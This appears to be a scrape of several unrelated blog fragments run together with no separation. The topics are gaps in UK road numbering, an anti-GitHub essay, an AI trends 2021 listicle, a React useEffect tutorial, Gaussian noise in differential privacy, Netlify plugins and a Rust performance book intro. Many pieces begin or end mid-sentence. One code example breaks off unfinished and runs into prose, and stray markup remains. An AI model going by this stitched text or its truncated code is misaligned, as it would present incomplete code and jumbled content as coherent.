<figure><table><tbody><tr><td><strong>Number of sections</strong></td><td><strong>Number of roads with this number of sections</strong></td></tr><tr><td>6</td><td>1</td></tr><tr><td>5</td><td>2</td></tr><tr><td>4</td><td>9</td></tr><tr><td>3</td><td>35</td></tr><tr><td>2</td><td>160</td></tr><tr><td>1</td><td>119</td></tr></tbody></table></figure>



<p>This takes a little explaining, partly because this is an instance of <a href="https://randomtechthoughts.blog/2018/10/23/counting-fence-panels-or-fence-posts/">counting fence posts vs. counting fence panels</a>, and partly because of ignoring small gaps.</p>



<p>If a road has 1 gap, it will have 2 sections (in the posts / panels analogy, the gap is the fence panel and the sections are the fence posts).  If a road has 2 gaps, it will have 3 sections etc.</p>



<p>However, imagine that the road has 2 gaps but 1 is below 500 m.  It will have sections A, B and C.  Imagine that the B – C gap is the one below 500 m.  This means that only section A is separated from the rest of the road by a gap we’re counting.  B and C are close enough to another section (the other one in the B / C pair) that their distance from the rest of the road will be below 500 m and we won’t count them.  So a road that is ‘split’ will have only 1 section in the table above.  Without this ignoring of small gaps, the smallest number of sections a split road could have is 2.</p>



<p>The maximum number of sections if you include gaps of any size is 16 (the A38).  Ignoring gaps below 500 m, the roads with the most sections are:</p>



<figure><table><tbody><tr><td><strong>Number of sections</strong></td><td><strong>Roads</strong></td></tr><tr><td>6</td><td>A361</td></tr><tr><td>5</td><td>A6, A422</td></tr><tr><td>4</td><td>A44, A417, A350, A272, A513, A489, A371, A63, A264</td></tr></tbody></table></figure>



<h2>Biggest gaps</h2>



<p>This map shows the ten roads with the biggest gaps.&nbsp; The line shows the gap in the road, i.e. where the road <em>isn’t</em>.&nbsp; There are bits of the road at each end of the line.  Sorry about the labels being hard to read – I suggest that you type the road name into an online map to explore the details of the ends of each gap.</p>

<h2>Summary</h2>



<p>There’s no big point to this post – I was just curious, and followed that curiosity into some data.&nbsp; I don’t know why there are gaps as large as on the map.&nbsp; My guess is that they aren’t actually one road split into two.&nbsp; Instead, there are two unrelated roads that happen to re-use the road number.</p>

The two most popular apprehensions are:</p>
<ul><li><em>"I need it for less.. technical users"</em> (or some variation of thereof)</li><li><em>"I need it for CI"</em> (continuous integration)</li></ul>



<p>There was a time I shared this hopeful belief.
<a href="https://en.wikipedia.org/wiki/Build_it_and_they_will_come">"Build it and they will come"</a> sort of thing.</p>
<p>I was deluding my self and perhaps you are too.
Unless your software is truly useful to many, or already popular through some other means, they will not come, Github or otherwise.</p>
<p>"But everyone has an account there so, it will be one step away".
A mostly-imaginary threshold.
It's in your head.
Think about it.. those with skills &amp; time, who can wholesomely contribute, will highly likely to already have email and perhaps <a href="https://xmpp.org/">XMPP</a> (<a href="https://movim.eu/">Movim</a>) or <a href="https://en.wikipedia.org/wiki/Internet_Relay_Chat">IRC</a>.
It is not the facilities stopping them, it's either skill or will to dedicate time.</p>
<p>"Yeah, but Github's interface is just easier and has issue-tracking and ..".
Again, mostly-imaginary threshold.
If one wishes to participate in a project, <em>really</em>, <strong>truly</strong>, wishing to participate, the buttons will not be a barrier.
In fact, from my brief time on Github and Gitlab, all I can attribute to the glossy interfaces was the drive-by comments, without any follow-through or interaction.
So it's a good filter rather than a bad barrier.</p>


<p>This is not the answer you are looking for.
I never bought into this and still stand by it.</p>
<p>Is your build complicated beyond what you can cope with?
Your tools taking longer than you can bare waiting for?</p>
<p>What does it say about our skills &amp; tools when the solution we gravitate towards is a commercial behemoth providing more automation, wattage &amp; time than we have at home?</p>
<p>How is it open when our dependency to this service seems to increase without any programmer being able to resist it?</p>
<p>And what about the environmental impact of continuously running these processes?</p>
<p>This is not a solution.
It is a harmful distraction, digression &amp; deferment both from writing good &amp; efficient code and migrating to a more nimble solution by upping our game.</p>


<p>Github (Gitlab too) have become the Facebook-Twitter of coders.
Merchants of "sweet approval", intermediaries we designated when we became desperate for the attention of others online.</p>
<p>Our insatiable desire for commentary, 'stars' &amp; pull-requests has gifted that enterprise an immense gravity.
While we are hooked on their mesmerising gimmicks, students are taught Github's interface instead of <code>git</code> commands and are expected to have an account with them if they are to register on the corporate map when searching for a job.</p>
<p>Worse still, we may have lost our soul.
Would we write code if no one was watching? For the enjoyment of the practice itself?
Those answering <em>yes</em>, fear not, you don't need them!</p>
<p>Move on, there is still a community out there, where you stand a better chance of (literally) unscripted interaction.
Our open source code, has propped their dominance for too long.
It's time to take it back!</p>

                        <p>Artificial intelligence and its subdomain Machine Learning (ML) have been showing promising trends over the past few years. At one side, AI is transforming the way of living and human interactions almost in every industry at large scale. On the other side the restrictions and polices imposed during COVID-19 pandemic has turned out to be an advantage for AI to grow. Given the lockdown situation and businesses turning towards digital transformation, AI has emerged as only futuristic technology that is not only solving and automating manual business workflows but also helping in <a href="https://thinkml.ai/top-5-cost-cutting-artificial-intelligence-ai-use-cases-in-banking-and-finance/">reducing the cost</a>. Year 2020 has witnessed many unique platforms, researches and tools that utilize AI to great extent, but year 2021 has promised much more and quite rightly called as the <strong>golden year</strong> for AI implementation.</p><p>Read also: <a href="https://thinkml.ai/top-10-ai-trends-to-watch-in-2020/">Top AI trends for year 2020</a></p><p>The global AI market size was calculated as $39.9 Billion in 2019 and expected to achieve <a href="https://www.grandviewresearch.com/industry-analysis/artificial-intelligence-ai-market">compound annual growth rate</a> (<strong>CAGR</strong>) up to 42.2% from 2020 to 2027. Technology has made innovations in big fields like healthcare, retail, automobile, and finance with continuous research. AI is one significant element that is promising to dominate and transform the digital era entirely with high accuracy and precision.</p><p>In this article, we have come up with <strong>Top 10 Artificial Intelligence Trends to watch in year 2021</strong>. These have the potential to hit great innovation in future. Let's have a look at these strategies:</p><h2 id="1-robotic-process-automation-rpa-">1. &nbsp;Robotic Process Automation (RPA)</h2><p>It's one of the most disruptive AI technologies that help in performing repetitive manual tasks. It can efficiently perform a high-volume, repetitive task on the desktop without creating any mess. The work might be of invoicing a client. For it, the robot opens email via RPA, copy the given data into a CRM database and then collect data from another related database. It replies to that client with new data. Besides, it can perform the given task multiple times in a day and saves human’s time to do some other productive task.</p><p>Robotic Process Automation is a robot that works on using software for performing repetitive manual tasks. If there is something beyond the knowledge of robot, it notifies its owner to step in. in a nutshell, RPA performs the mundane task and give time to people for more exciting work.</p><p>RPA would be in use in billing, invoicing, payroll processing, extracting data, tracking, and shipment scheduling. Its also known as <strong>Hybrid Workforce </strong>that shows the collaboration of human workforce with robots.</p><p><strong>Vanguard </strong>is a financial service providing company that comes <a href="https://about.vanguard.com/who-we-are/fast-facts/">$5.6 trillion</a> in global assets under management department. The company uses <a href="https://www.cio.com/article/3048318/roboadvisors-stand-at-the-vanguard-of-human-machine-collaboration.html">RPA</a> for doing exceptional trading tasks. It works with, "when x happens, do y." However, the RPA system cannot eliminate the need for humans. The combination of humans and technology helps in providing better services to clients and allowing humans to focus on complex tasks.</p><h2 id="2-ai-in-healthcare">2. &nbsp;AI in Healthcare</h2><p>AI is already helping the healthcare industry to a great extent with high accuracy, but further advancements will surprise everyone. AI developing companies are struggling hard to create advanced tools for enhancing the health industry’s capabilities—AI-inspired humans in recovering patients from recent pandemic COVID-19. <a href="https://www.techopedia.com/definition/27745/big-data">Big Data</a> was used to identify COVID Patients and significant hot spots. Moreover, researchers developed thermal cameras and <a href="https://www.techopedia.com/definition/2953/mobile-application-mobile-app">smartphone apps</a> for measuring the temperature of individuals and collecting data for healthcare organizations.</p><p>AI can help healthcare department in many unique ways by using data analysis and predicting different results. AI and ML tools provide insights about human health and also suggest preventive measures to stop the disease spreading. There is another AI trend; AI Watches that can help doctors to track their patient’s health remotely.</p><h3 id="predicting-pandemic-even-before-it-s-start">Predicting Pandemic Even Before It’s Start</h3><p>Now researchers are working on advanced AI algorithms for accurately predicting future outbreaks. Some of the significant research is already done on it that generated some earliest alerts about the current pandemic. In Wuhan, China, the <a href="https://www.cnbc.com/2020/03/03/bluedot-used-artificial-intelligence-to-predict-coronavirus-spread.html"><strong>BlueDot Tool</strong></a><strong> </strong>by Toronto was scanning over 100,000 governmental and media data daily and shared an alert about the potential pandemic.</p><h2 id="3-ai-for-cybersecurity-data-breaches">3. &nbsp;AI for Cybersecurity &amp; Data Breaches</h2><p>The use of advanced AI tools will collect and analyze a wide range of data sets. It will fetch information from news, blogs, websites, and stories to identify all threats. As it collects more data, the system will become more precise.</p><p>In 2021 and beyond, digital data will be at more risk to be hacked and vulnerable to phishing attacks. AI and advanced technologies will provide support to the security department against malicious activities in every field. AI will help to prevent cybercrimes in future with enhanced enterprise <a href="https://thinkml.ai/use-of-artificial-intelligence-in-cybersecurity/">cybersecurity</a> measures. The AI-supported system will spot fake digital activity or transactions that follow criminal patterns.</p><p>Its preventive alarms will protect sensitive data information from data hacking firms. Furthermore, it will take only a few seconds to detect any threatening activity, including suspicious IP addresses. It allows security dealers to respond to these activities faster than usual. Because of its high efficiency and advantages, the demand for AI in cybersecurity will rise in 2021.</p><h2 id="4-natural-language-processing-nlp-">4. &nbsp;Natural Language Processing (NLP)</h2><p>Here machine learning models teach computers to understand what's written or spoken material describing a specific process. It becomes one of the top and highly-demanded application of AI in the present time. The popularity of NLP is rising because of its significant usage as Amazon Alexa and Google Home. NLP eliminated the need for writing or interacting with a screen as now humans interact with robots that understand their language.</p><p>Natural Language Processing comes with two sub-applications.</p><p><strong>Natural Language Understanding: </strong>As its name shows, it enables a machine to review a written text and understands its meaning correctly.</p><p><strong>Natural Language Generation: </strong>It’s a logical response that a machine generates for any given input, for instance, any text.</p><p>The use of NLP will increase in 2021 for sentiment analysis, machine translation, summarizing a process, auto-video caption generation and as chatbots.</p><p>YouTube uses NLP technology in generating captions automatically across its platform. YouTube Video involves a <strong>speech recognition software </strong>that produces video cations. The system used this technology first in 2009 for translation of dozens of languages.</p><h2 id="5-reinforcement-learning">5. &nbsp;Reinforcement Learning</h2><p>Reinforced Learning (RL) is one of the demanded skills of future by different organizations. It's a particular application of deep learning that works based on its experience for improving data's effectiveness. In this learning process, the software is ingested with several different conditions that tell about its specific task performance. Thus, various actions define about self-learned actions of software that it performs to get the final result.</p><p>For instance, <a href="https://www.techopedia.com/definition/16366/chatterbot">Chatbot</a> has information to respond to a general user's queries like greetings, order booking, or consultations calls. <strong>Machine Learning Development Companies </strong>can add sequential conditions in chatbots by using RL. It will make them more productive and helpful in getting more sales and transferring calls to the relevant department. Some other useful applications of RL are robotics in planning business strategies, advertising content optimization, automating industries, controlling aircraft, and making motion control robots. Moreover, it allows personalized recommendations with the optimization of the product's advertising budget.</p><p>Alibaba, an outstanding Chinese e-commerce site, uses Reinforced Learning to boost its return by 24% for online advertisement without rising its budget. The team at Alibaba explained in a <a href="https://arxiv.org/abs/1803.00259">research paper</a> that how they used RL in optimizing <strong>sponsored search campaign. </strong>They created a bidding model for impression every hour and performed real-time bidding with it.</p><h2 id="6-the-joining-of-the-internet-of-things-with-ai-aiot-">6. &nbsp;The Joining of the Internet of Things with AI (AIoT)</h2><p>Internet of Things (IoT) is in use for proper management of interconnected devices. These devices are performing exceptional tasks in different organizations, homes, and companies. However, researchers enhanced the capabilities of IoT devices by coupling them with AI. IoT technology has potential to offer real-time information in software and <a href="https://searchcustomerexperience.techtarget.com/definition/CRM-customer-relationship-management">customer relationship management (CRM)</a>. It will also monitor the performance of several interconnected gadgets.</p><p>These AI-powered smart solutions can be used for high maintenance in industrial devices. It also helps in delivering or discussing problems remotely. AI and IoT, when employed together, will offer an incredible ear for exciting insights. Sensor powered AI will help in bringing predictive maintenance in manufacturing goods. <strong>Smart Home Devices </strong>like <a href="https://nest.com/">Nest</a> (Google's application) will gain popularity. According to an estimation, 28% of the US homes will become smart homes by 2021. It will resultantly boost efficiency to achieve the next level.</p><p>Another example is AI applications allowing field agents to spot faulty machines. It works with image recognition feature embedded in <a href="https://www.damcogroup.com/blogs/field-service-management-software-solution/">Field Service Applications</a>. AIoT supports businesses by detecting defects and providing predictive maintenance.</p><h2 id="7-facial-recognition-a-breakthrough-in-2021">7. &nbsp;Facial Recognition- A Breakthrough in 2021</h2><p>Because of the current COVID-19 issues, facial recognition technology will grow at a rapid pace in 2021. &nbsp;It identifies facial features from images and videos by using biometrics and then compare this information with the already available database.</p><p>Facebook is a social platform that uses Depp Face Program in tagging family members and friends in a photo.

November 17, 2020 | https://maxrozen.com/fetching-data-react-with-useeffect/ | <a href="https://web.archive.org/web/*/https://maxrozen.com/fetching-data-react-with-useeffect/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>So you’re building a component, and need to fetch some data from an API before rendering your component. You’ve been told that useEffect is <em>the way</em> for fetching data, but all you can find is discussion about side-effects (particularly in the official <a href="https://reactjs.org/docs/hooks-reference.html#useeffect">useEffect docs</a>).</p>
<p>Let’s unpack what side-effects are, and fetch ourselves some data.</p>
<h2 id="what-are-side-effects"><a href="#what-are-side-effects" aria-label="what are side effects permalink"></a>What are side-effects?</h2>
<p>To talk about side-effects, we should probably first talk about <b>pure functions</b>.</p>
<p>A pure function is a function, that when given an input, will always returns the same output. Pure functions also don’t modify the arguments passed to them.</p>
<p>While you can have pure functions as simple as this:</p>
<div data-language="js"><pre><code><span>function</span> <span>myPureFunction</span><span>(</span><span>count</span><span>)</span> <span>{</span>
  <span>return</span> count <span>+</span> <span>1</span><span>;</span>
<span>}</span></code></pre></div>
<p>We can also have pure functions that return JSX in React:</p>
<div data-language="jsx"><pre><code><span>function</span> <span>MyComponent</span><span>(</span><span>props</span><span>)</span> <span>{</span>
  <span>return</span> <span><span><span>&lt;</span>div</span> <span>className</span><span><span>=</span><span>{</span>props<span>.</span>className<span>}</span></span><span>&gt;</span></span><span>Some content goes here</span><span><span><span>&lt;/</span>div</span><span>&gt;</span></span><span>;</span>
<span>}</span></code></pre></div>
<p>Side-effects then, are operations that change things outside of your function, making the function impure.</p>
<p>Fetching data from an API, communicating with a database, and sending logs to a logging service are all considered side-effects, as it’s possible to have a different output for the same input. For example, your request might fail, your database might be unreachable, or your logging service might have reached its quota.</p>
<p>This is why useEffect is the hook for us - by fetching data, we’re making our React component impure, and useEffect provides us a safe place to write impure code.</p>
<h2 id="fetching-data"><a href="#fetching-data" aria-label="fetching data permalink"></a>Fetching data</h2>
<p>Here’s how to use useEffect to <em>only</em> fetch data (there are a few more steps to make it useful):</p>
<div data-language="jsx"><pre><code><span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>const</span> <span>fetchData</span> <span>=</span> <span>async</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>const</span> response <span>=</span> <span>await</span> <span>fetch</span><span>(</span><span><span>`</span><span>https://swapi.dev/api/people/1/</span><span>`</span></span><span>)</span><span>;</span>
    <span>const</span> newData <span>=</span> <span>await</span> response<span>.</span><span>json</span><span>(</span><span>)</span><span>;</span>
  <span>}</span><span>;</span>

  <span>fetchData</span><span>(</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>;</span></code></pre></div>
<p>You might notice a few things are missing from this example:</p>
<ul>
<li>we’re not doing anything with the data once we fetch it</li>
<li>we’ve hardcoded the URL to fetch data from</li>
</ul>
<p>To make this useEffect useful, we’ll need to:</p>
<ul>
<li>update our useEffect to pass a prop called <code>id</code> to the URL,</li>
<li>use a <a href="https://maxrozen.com/learn-useeffect-dependency-array-react-hooks/">dependency array</a>, so that we only run this useEffect when <code>id</code> changes, and then</li>
<li>use the useState hook to store our data so we can display it later</li>
</ul>
<div data-language="jsx"><pre><code><span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>const</span> <span>fetchData</span> <span>=</span> <span>async</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>

<p>Now let’s build the rest of the component. It needs to:</p>
<ul>
<li>store our fetched data using useState</li>

<li>render nothing if we don’t have data</li>
</ul>

<p>You might find fetching data in this way results in quite a bit of repeated code, especially if you’re using <code>fetch</code>, and handle error and loading states. To avoid this, a common solution is to <a href="https://reactjs.org/docs/hooks-custom.html#extracting-a-custom-hook">write a custom hook</a>.</p>
<p>If you also want caching (to avoid requesting the same data twice), I highly recommend looking into one of these <a href="https://maxrozen.com/keeping-up-with-react-libraries/#data-fetching-libraries">data fetching libraries</a> instead.</p></div></div>]]>

</small></p>
<hr>
<p><span>P</span><strong>reviously</strong>, we used Gaussian noise to explain
the <a href="https://desfontain.es/privacy/privacy-loss-random-variable.html">real meaning of <span>\(\delta\)</span></a> in <span>\((\varepsilon,\delta)\)</span>-differential
privacy. One question was left unanswered: why would anyone use Gaussian noise
in the first place? The guarantees it provides aren't as strong: it gives
<span>\((\varepsilon,\delta)\)</span>-DP with <span>\(\delta&gt;0\)</span>, while Laplace noise provides pure
<span>\(\varepsilon\)</span>-DP. This blog post gives an answer to this question, and describes
the situations in which Gaussian noise excels.</p>

<p>A first advantage of Gaussian noise is that the distribution itself behaves
nicely. It's called the <a href="https://en.wikipedia.org/wiki/Normal_distribution"><em>normal</em> distribution</a> for a reason: it has
convenient properties, and is very widely used in natural and social sciences.
People often use it to model random variables whose actual distribution is
unknown. If you sum many independent random variables, you <a href="https://en.wikipedia.org/wiki/Central_limit_theorem">end up with a normal
distribution</a>. And these are just a few of the <a href="https://en.wikipedia.org/wiki/Normal_distribution#Properties">many
properties</a> of this fundamental distribution. Thus, most data
analysts and scientists are already familiar with Gaussian noise. It's
convenient when you release anonymized statistics: analysts don't need to learn
too many new concepts to understand what you're doing to protect the data.</p>
<p>A second advantage is that the Gaussian distribution has nice, <em>thin</em> tails. The
vast majority of its probability mass is focused around its mean. Take a normal
distribution with mean 0 and standard deviation <span>\(\sigma\)</span>. The <a href="https://en.wikipedia.org/wiki/68%E2%80%9395%E2%80%9399.7_rule">68–95–99.7
rule</a> says that a random variable sampled from this distribution will be:</p>
<ul>
<li>in <span>\([-\sigma,\sigma]\)</span> with 68% probability;</li>
<li>in <span>\([-2\sigma,2\sigma]\)</span> with 95% probability;</li>
<li>and in <span>\([-3\sigma,3\sigma]\)</span> with 99.7% probability.</li>
</ul>
<p>It even gets better as you go further away from the mean. The probability that
the random variable is <em>outside</em> <span>\([-k\sigma,k\sigma]\)</span> decreases faster than
<span>\(e^{-k^2/2}\)</span>. In practice, you're rarely surprised by the values that a Gaussian
distribution takes. Even if you sample <span>\(1,000,000\)</span> values, they are all probably
going to be within <span>\([-5\sigma,5\sigma]\)</span>.</p>
<p>Laplace, by comparison, isn't quite as nice. Its tails decrease exponentially fast,
but that's still much slower than Gaussian's. Suppose you sample <span>\(1,000,000\)</span>
values from a Laplace distribution of standard deviation <span>\(\sigma\)</span>. On average,
<strong>849</strong> of them will be outside <span>\([-5\sigma,5\sigma]\)</span>.</p>
<p>OK, so Gaussian noise is nice. But that does not change a simple fact: to get
a comparable level of privacy for a single statistic, Laplace is much better.
Assume that we're adding noise to a simple count, of sensitivity <span>\(1\)</span>. This graph
compares the Laplace noise needed to get <span>\(\varepsilon=1\)</span>, and Gaussian noise
needed to get <span>\(\varepsilon=1\)</span> and <span>\(\delta=10^{-5}\)</span>.</p>
<center>
<img alt="Graph showing a Laplace distribution with scale 1/ln(3) and a Gaussian distribution of standard deviation 3.426, both centered on 0" src="https://desfontain.es/privacy/images/laplace-gaussian-ln-3.svg">
</center>
<p>Despite its weaker privacy guarantees, the Gaussian distribution is much
flatter. Its standard deviation is over 3.4, while Laplace's is less than 1.3.
Thus, much more noise will need to be added, and analysts mainly care about
minimizing the noise. Why, then, would Gaussian noise be a good option? The answer
is simple: because it gets better when you're publishing a lot of statistics.</p>

<p>In most of our <a href="https://desfontain.es/privacy/differential-privacy-in-practice.html">previous examples</a>, we assumed that each individual
appeared in a <em>single</em> statistic. This case is common, for example when
partitioning individuals based on demographic information. But in many
applications, this assumption does not hold. Imagine, for example, that you want
to answer the question: «&nbsp;what type of specialized physicians did people visit
in the past 10 years?&nbsp;»</p>
<p>Assume we're working in the <a href="https://desfontain.es/privacy/local-global-differential-privacy.html">central model</a>. We have a dataset of 〈user
id, specialist type〉 pairs, and each record corresponds to an individual
visiting a specialized physician (cardiologist, dermatologist, radiologist,
etc.). We want to count the number of unique user IDs per specialty.</p>
<p>Note that each user can only influence a single count <em>once</em>. We count
<em>distinct</em> user IDs: if you visit dermatologists 10 times, you will only add 1
to the "dermatologist" count. However, a single user might visit many types of
specialized physicians. There are <a href="https://en.wikipedia.org/wiki/Medical_specialty">many kinds of
specialties</a>, and a single user
might influence all the counts. Say there are 50 of them.</p>
<p>How to make these counts differentially private? A first solution is to <a href="https://desfontain.es/privacy/differential-privacy-in-practice.html#multiple-statistics"><em>split
the privacy budget</em></a> across all the counts. Here, we can
split our privacy budget in 50. If we want to achieve <span>\(\varepsilon=1\)</span>, we
compute <span>\(\varepsilon'=1/50=0.02\)</span>, and add Laplace noise of scale
<span>\(1/\varepsilon'=50\)</span> to all the counts.</p>
<p>Unfortunately, this is a lot of noise.</p>
<center>
<img alt="Graph showing a Laplace distribution with scale 0.02, centered on 0" src="https://desfontain.es/privacy/images/laplace-0.02.svg">
</center>
<p>Fortunately, this is exactly the kind of situation in which Gaussian noise
shines. When a single user can impact <span>\(k\)</span> distinct statistics, we need to scale
Laplace noise by <span>\(k\)</span>. By contrast, Gaussian noise must only be scaled by
<span>\(\sqrt{k}\)</span>. Comparing the two gives a much more flattering view of Gaussian's power.</p>
<center>
<img alt="Graph showing a Laplace distribution with scale 0.02, and a Gaussian distribution of standard deviation 26.38, both centered on 0" src="https://desfontain.es/privacy/images/gaussian-laplace-50.svg">
</center>
<p>OK, so that's the general idea. Now, <em>why</em> does that happen? How come
composition doesn't seem to behave in the same way for Laplace and Gaussian? To
understand this better, we'll first introduce the concept of <em>sensitivity</em>.</p>

<p>Consider our example above. For each type of specialized physician, we count the
people who consulted with one. But we won't consider this histogram as 50
different counting queries. Instead, we'll consider it as a <em>single</em> function,
with values in <span>\(\mathbb{N}^{50}\)</span>. It outputs a <em>vector</em>: a list of 50
coordinates, each of which corresponds to a fixed specialty. How to make such a
function <span>\(f\)</span> differentially private? We'll add noise, scaled by the function's
<em>sensitivity</em>.</p>
<p>The sensitivity of a function measures how much its output can change when you
add one record in the database. If the function returns a single number, we
measure the <em>absolute value</em> of the difference: the sensitivity of <span>\(f\)</span> is the
maximum value of <span>\(\left|f\left(D_1\right)-f\left(D_2\right)\right|\)</span>. We already
encountered the sensitivity before: when <a href="https://desfontain.es/privacy/differential-privacy-in-practice.html#counting-things">counting things</a>, if each user
can change the statistic by more than <span>\(1\)</span>, we needed to scale the noise
accordingly. The same happened for sums.</p>
<p>Here, the function <span>\(f\)</span> returns a vector. How do we measure the distance between
two vectors? We have a few options. We could use the <a href="https://en.wikipedia.org/wiki/Taxicab_geometry">Manhattan
distance</a>, or the <a href="https://en.wikipedia.org/wiki/Euclidean_distance">Euclidean distance</a>, or even <a href="https://en.wikipedia.org/wiki/Norm_(mathematics)#p-norm">weirder
stuff</a>. As it turns out, the distance we need to use depends on which noise
function we're adding. Laplace noise is scaled by the <span>\(L^1\)</span>-sensitivity, itself
based on the Manhattan distance. Here is its definition, denoting by <span>\(f_i(D)\)</span>
the <span>\(i\)</span>-th coordinate of <span>\(f(D)\)</span>:</p>
<p>$$
\Delta_1(f) = \max \sum_{i=1}^{50} \left|f_i\left(D_1\right)-f_i\left(D_2\right)\right|
$$</p>
<p>where the <span>\(\max\)</span> is taken over <span>\(D_1\)</span>
and <span>\(D_2\)</span> differing in a single record. This is easy to understand: you just sum
the sensitivities for each coordinate. For our function <span>\(f\)</span>, we have
<span>\(\Delta_1(f)=50\)</span>: Laplace noise needs to be scaled by 50. You might have noticed
that this is equivalent to using simple composition: the scale of Laplace noise
is <span>\(\Delta_1/\varepsilon\)</span>, so dividing <span>\(\varepsilon\)</span> by <span>\(50\)</span> is the same as
considering all coordinates together.</p>
<p>By contrast, Gaussian noise needs to be scaled by the <span>\(L^2\)</span>-sensitivity. This
type of sensitivity is based on the Euclidean distance, and defined by:</p>
<p>$$
\Delta_2(f) = \max \sqrt{\sum_{i=1}^{50} {\left|f_i\left(D_1\right)-f_i\left(D_2\right)\right|}^2}
$$</p>
<p>still taking the <span>\(\max\)</span> over <span>\(D_1\)</span> and
<span>\(D_2\)</span> differing in a single record. This formula might look complicated, but the
Euclidean distance is a simple concept: it's the length of a straight line
between two points. If you only have two dimensions, this formula might be
reminiscent of the <a href="https://en.wikipedia.org/wiki/Pythagorean_theorem">Pythagorean theorem</a>!</p>
<p>The standard deviation <span>\(\sigma\)</span> of Gaussian noise will be proportional to
<span>\(\Delta_2(f)\)</span>. Let's compute this value for our function. Each user can change a
single count by at most one, and each can change all counts. Thus:</p>
<p>$$
\Delta_2(f) = \sqrt{\sum_{i=1}^{50} 1^2} = \sqrt{50} \approx 7.07.
$$</p>
<p>The noise scales with the <em>square root</em> of the number of counts. This is key to
Gaussian's superiority in such situations: the <span>\(L^2\)</span>-sensitivity grows much more
slowly than the <span>\(L^1\)</span> sensitivity. As a result, scaling the noise by the
sensitivity hurts accuracy much less. Of course, using Gaussian gives you
<span>\((\varepsilon,\delta)\)</span>-DP, not pure DP, so there is still a tradeoff. As we saw
in the <a href="https://desfontain.es/privacy/privacy-loss-random-variable.html">previous article</a>, this isn't a super scary <span>\(\delta\)</span>, so it's
generally worth it.</p>
<p><a href="https://arxiv.org/abs/1805.06530">This paper</a> (Theorem 8) gives the exact
formula for calibrating Gaussian noise depending on <span>\(\Delta_2(f)\)</span>, <span>\(\varepsilon\)</span>
and <span>\(\delta\)</span>. You need to pick <span>\(\sigma\)</span> such that the following equality holds:</p>
<p>$$
  g\left(\frac{\Delta_2(f)}{\sigma},\varepsilon\right) = \delta
$$</p>
<p>where <span>\(g\)</span> is a complicated function. As
you can see, increasing <span>\(\Delta_2(f)\)</span> and <span>\(\sigma\)</span> simultaneously has no effect:
<span>\(\sigma\)</span> is proportional to <span>\(\Delta_2(f)\)</span>. There is no analytic form for
<span>\(\sigma\)</span>, but since <span>\(g\)</span> is monotonic, you use e.g. a binary search to
approximate its value. If you want to know the exact formula, click here:

<p>Now, why do these two noise distributions work so differently? Rather than
proving this formally, …</p></div></div>

The key to achieving a great web experience is making sure that your website is optimized and tested thoroughly. Testing a small website manually can be easy but a large website that is controlled by a team through a CMS requires automated tools. These days most website owners are shifting towards JAMstack. Netlify is one of the best platforms to host JAMstack websites. In this blog, we will list some of the best Netlify plugins that you can use to offer a great web experience to your viewers.</p><h2 id="1-checklinks"><a href="https://github.com/munter/netlify-plugin-checklinks">1. Checklinks</a></h2><p>Broken links on your website can result in embarrassment and a huge dropout rate. You can manually check broken links on your website but it is better if we can automate the process. <strong>Checklinks</strong> helps to keep all the assets references correct and avoid 404 links to the internal pages, as well as the external pages your website links to. It can also report on inefficient redirect chains and potential mixed content warnings.</p><h2 id="2-deployment-hours"><a href="https://github.com/neverendingqs/netlify-deployment-hours-plugin">2. Deployment Hours</a></h2><p>Sometimes, in the middle of the night, one of your team members can trigger a new deployment which can by chance break the website. What next? Your team members are called and you have to fix the bug at the time you were about to sleep. So to blocks deployments that happen outside of the specified deployment hours range, you can use the <strong>Deployment Hours</strong> Netlify plugin.</p><h2 id="3-html-validate"><a href="https://github.com/oliverroick/netlify-plugin-html-validate">3. HTML Validate</a></h2><p><strong>HTML Validate</strong> Netlify plugin allows you to validate your HTML website build. It is extremely important to test the validity of the HTML because not only it can break your website’s design structure but also affect the SEO as the GoogleBot won’t be able to parse your website correctly. For example,</p><div><div><pre><code><span>&lt;p&gt;</span>
  <span>&lt;button&gt;</span>Click me!<span>&lt;/button&gt;</span>
  <span>&lt;div</span> <span>id=</span><span>"show-me"</span><span>&gt;</span>
    Lorem ipsum
  <span>&lt;/div&gt;</span>
<span>&lt;/p&gt;</span>
</code></pre></div></div><p>The validation of the above HTML will produce the following error in the terminal:</p><pre><code>1:1  error  Element &lt;p&gt; is implicitly closed by adjacent &lt;div&gt;  no-implicit-close
2:2  error  Button is missing type attribute                    button-type
6:4  error  Unexpected close-tag, expected opening tag          close-order
</code></pre><h2 id="4-lighthouse"><a href="https://github.com/netlify-labs/netlify-plugin-lighthouse">4.

<p>Performance is important for many Rust programs. </p>
<p>This book contains many techniques that can improve the performance—speed and
memory usage—of Rust programs. The <a href="https://nnethercote.github.io/perf-book/compile-times.html">Compile Times</a> section also contains some
techniques that will improve the compile times of Rust programs. Some of the
book’s techniques only require changing build configurations, but many require
changing code.</p>
<p>Some of the techniques within are entirely Rust-specific, and some involve
ideas that can be applied (often with modifications) to programs written in
other languages. The <a href="https://nnethercote.github.io/perf-book/general-tips.html">General Tips</a> section also includes some general
principles that apply to any programming language. Nonetheless, this book is
mostly about the performance of Rust programs and is no substitute for a
general purpose guide to profiling and optimization.</p>
<p>The book also focuses on techniques that are practical and proven: many are
accompanied by links to pull requests or other resources that show how the
technique was used on a real-world Rust program.</p>
<p>This book is aimed at intermediate and advanced Rust users. Beginner Rust users
have more than enough to learn and these techniques are likely to be an
unhelpful distraction to them.</p>

November 17, 2020 | https://www.logicalclocks.com/blog/hopsworks-feature-store-api-2-0 | <a href="https://web.archive.org/web/*/https://www.logicalclocks.com/blog/hopsworks-feature-store-api-2-0">archive.org</a>
